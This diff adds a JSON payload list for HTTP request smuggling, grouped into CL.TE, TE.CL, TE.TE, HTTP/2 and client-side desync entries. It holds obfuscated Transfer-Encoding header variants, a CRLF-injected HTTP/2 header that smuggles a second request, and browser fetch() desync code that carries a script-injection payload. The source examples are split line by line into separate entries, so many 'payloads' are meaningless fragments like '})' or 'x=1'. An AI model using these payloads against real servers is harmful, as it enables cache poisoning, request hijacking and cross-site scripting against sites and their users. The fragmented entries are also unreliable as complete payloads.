@@ -1,0 +1,380 @@
+[
+  {
+    "id": "request-smuggling-1",
+    "title": "CL.TE Vulnerabilities",
+    "payload": "POST / HTTP/1.1",
+    "context": "CL.TE Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-2",
+    "title": "CL.TE Vulnerabilities",
+    "payload": "Host: vulnerable-website.com",
+    "context": "CL.TE Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-3",
+    "title": "CL.TE Vulnerabilities",
+    "payload": "Content-Length: 13",
+    "context": "CL.TE Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-4",
+    "title": "CL.TE Vulnerabilities",
+    "payload": "Transfer-Encoding: chunked",
+    "context": "CL.TE Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-5",
+    "title": "CL.TE Vulnerabilities",
+    "payload": "SMUGGLED",
+    "context": "CL.TE Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-6",
+    "title": "CL.TE Vulnerabilities",
+    "payload": "Host: domain.example.com",
+    "context": "CL.TE Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-7",
+    "title": "CL.TE Vulnerabilities",
+    "payload": "Connection: keep-alive",
+    "context": "CL.TE Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-8",
+    "title": "CL.TE Vulnerabilities",
+    "payload": "Content-Type: application/x-www-form-urlencoded",
+    "context": "CL.TE Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-9",
+    "title": "CL.TE Vulnerabilities",
+    "payload": "Content-Length: 6",
+    "context": "CL.TE Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-10",
+    "title": "TE.CL Vulnerabilities",
+    "payload": "Content-Length: 3",
+    "context": "TE.CL Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-11",
+    "title": "TE.CL Vulnerabilities",
+    "payload": "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86",
+    "context": "TE.CL Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-12",
+    "title": "TE.CL Vulnerabilities",
+    "payload": "Content-Length: 4",
+    "context": "TE.CL Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-13",
+    "title": "TE.CL Vulnerabilities",
+    "payload": "Connection: close",
+    "context": "TE.CL Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-14",
+    "title": "TE.CL Vulnerabilities",
+    "payload": "Accept-Encoding: gzip, deflate",
+    "context": "TE.CL Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-15",
+    "title": "TE.CL Vulnerabilities",
+    "payload": "5c",
+    "context": "TE.CL Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-16",
+    "title": "TE.CL Vulnerabilities",
+    "payload": "GPOST / HTTP/1.1",
+    "context": "TE.CL Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-17",
+    "title": "TE.CL Vulnerabilities",
+    "payload": "Content-Length: 15",
+    "context": "TE.CL Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-18",
+    "title": "TE.CL Vulnerabilities",
+    "payload": "x=1",
+    "context": "TE.CL Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-19",
+    "title": "TE.TE Vulnerabilities",
+    "payload": "Transfer-Encoding: xchunked",
+    "context": "TE.TE Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-20",
+    "title": "TE.TE Vulnerabilities",
+    "payload": "Transfer-Encoding : chunked",
+    "context": "TE.TE Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-21",
+    "title": "TE.TE Vulnerabilities",
+    "payload": "Transfer-Encoding: x",
+    "context": "TE.TE Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-22",
+    "title": "TE.TE Vulnerabilities",
+    "payload": "Transfer-Encoding:[tab]chunked",
+    "context": "TE.TE Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-23",
+    "title": "TE.TE Vulnerabilities",
+    "payload": "[space]Transfer-Encoding: chunked",
+    "context": "TE.TE Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-24",
+    "title": "TE.TE Vulnerabilities",
+    "payload": "X: X[\\n]Transfer-Encoding: chunked",
+    "context": "TE.TE Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-25",
+    "title": "TE.TE Vulnerabilities",
+    "payload": "Transfer-Encoding",
+    "context": "TE.TE Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-26",
+    "title": "TE.TE Vulnerabilities",
+    "payload": ": chunked",
+    "context": "TE.TE Vulnerabilities",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-27",
+    "title": "HTTP/2 Request Smuggling",
+    "payload": ":method GET",
+    "context": "HTTP/2 Request Smuggling",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-28",
+    "title": "HTTP/2 Request Smuggling",
+    "payload": ":path /",
+    "context": "HTTP/2 Request Smuggling",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-29",
+    "title": "HTTP/2 Request Smuggling",
+    "payload": ":authority www.example.com",
+    "context": "HTTP/2 Request Smuggling",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-30",
+    "title": "HTTP/2 Request Smuggling",
+    "payload": "header ignored\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: www.example.com",
+    "context": "HTTP/2 Request Smuggling",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-31",
+    "title": "Client-Side Desync",
+    "payload": "Host: www.example.com",
+    "context": "Client-Side Desync",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-32",
+    "title": "Client-Side Desync",
+    "payload": "Content-Length: 37",
+    "context": "Client-Side Desync",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-33",
+    "title": "Client-Side Desync",
+    "payload": "GET / HTTP/1.1",
+    "context": "Client-Side Desync",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-34",
+    "title": "Client-Side Desync",
+    "payload": "fetch('https://www.example.com/', {method: 'POST', body: \"GET / HTTP/1.1\\r\\nHost: www.example.com\", mode: 'no-cors', credentials: 'include'} )",
+    "context": "Client-Side Desync",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-35",
+    "title": "Client-Side Desync",
+    "payload": "fetch('https://www.example.com/redirect', {",
+    "context": "Client-Side Desync",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-36",
+    "title": "Client-Side Desync",
+    "payload": "method: 'POST',",
+    "context": "Client-Side Desync",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-37",
+    "title": "Client-Side Desync",
+    "payload": "body: `HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y`,",
+    "context": "Client-Side Desync",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-38",
+    "title": "Client-Side Desync",
+    "payload": "credentials: 'include',",
+    "context": "Client-Side Desync",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-39",
+    "title": "Client-Side Desync",
+    "payload": "mode: 'cors' // throw an error instead of following redirect",
+    "context": "Client-Side Desync",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-40",
+    "title": "Client-Side Desync",
+    "payload": "}).catch(() => {",
+    "context": "Client-Side Desync",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-41",
+    "title": "Client-Side Desync",
+    "payload": "location = 'https://www.example.com/'",
+    "context": "Client-Side Desync",
+    "tags": [
+      "request-smuggling"
+    ]
+  },
+  {
+    "id": "request-smuggling-42",
+    "title": "Client-Side Desync",
+    "payload": "})",
+    "context": "Client-Side Desync",
+    "tags": [
+      "request-smuggling"
+    ]
+  }
+]
